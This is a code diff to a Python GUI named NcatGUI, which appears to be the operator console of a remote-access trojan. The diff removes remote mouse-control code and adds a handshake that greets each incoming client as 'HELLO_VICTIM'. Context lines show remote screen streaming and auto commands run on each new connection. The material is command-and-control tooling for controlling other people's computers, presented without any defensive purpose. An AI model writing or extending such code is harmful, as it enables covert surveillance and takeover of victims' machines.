@@ -174,20 +174,6 @@ class NcatGUI(ctk.CTk):
         except KeyError:
             print("Error: No resolution data for current connection")
 
-    def on_mouse_click(self, event, connection_name):
-        # Get actual display dimensions of video feed
-        display_width = event.widget.winfo_width()
-        display_height = event.widget.winfo_height()
-    
-        # Update scaling factors
-        self.update_scaling_factors(display_width, display_height)
-    
-        # Scale coordinates
-        scaled_x = int(event.x * self.stream_scale_x)
-        scaled_y = int(event.y * self.stream_scale_y)
-    
-        # Send command to client
-        self.send_specific_command(f"mouse_move {scaled_x} {scaled_y}", connection_name)
 
 
     # Modified window creation with component tracking
@@ -216,7 +202,6 @@ class NcatGUI(ctk.CTk):
     
         video_label = ctk.CTkLabel(video_frame, text="")
         video_label.pack(fill="both", expand=True)
-        video_label.bind("<Button-1>", lambda event: self.on_mouse_click(event, connection_name))
     
         # Store reference to video label
         stream_window.video_label = video_label
@@ -292,14 +277,6 @@ class NcatGUI(ctk.CTk):
 
         finally:
             conn.close()
-
-    def move_mouse(self, x, y):
-        try:
-            if platform.system() == "Windows":
-                import ctypes
-                ctypes.windll.user32.SetCursorPos(x, y)
-        except Exception as e:
-            self.log_message("Main Listener", f"Error moving mouse: {str(e)}", "error")
 
     def update_stream_display(self, frame, connection_name):
         if connection_name not in self.stream_windows:
@@ -509,6 +486,21 @@ class NcatGUI(ctk.CTk):
             return False
 
     def handle_new_connection(self, client_socket, address):
+        # Perform handshake validation
+        try:
+            # Step 1: Send handshake message
+            handshake_message = "HELLO_VICTIM"
+            client_socket.send(handshake_message.encode())
+
+            # Step 2: Wait for the victim's response
+            response = client_socket.recv(1024).decode().strip()
+
+        except Exception as e:
+            self.log_message("Main Listener", f"Handshake error with {address}: {str(e)}", "error")
+            client_socket.close()
+            return
+
+        # If handshake is successful, proceed with the connection
         self.connection_count += 1
         connection_name = f"Connection {self.connection_count}"
         self.active_connections.append(connection_name)
@@ -537,6 +529,7 @@ class NcatGUI(ctk.CTk):
 
         if self.settings["auto_commands"]:
             self.after(500, lambda: self.run_auto_commands(connection_name))
+
 
     def run_auto_commands(self, connection_name):
         basic_commands = [
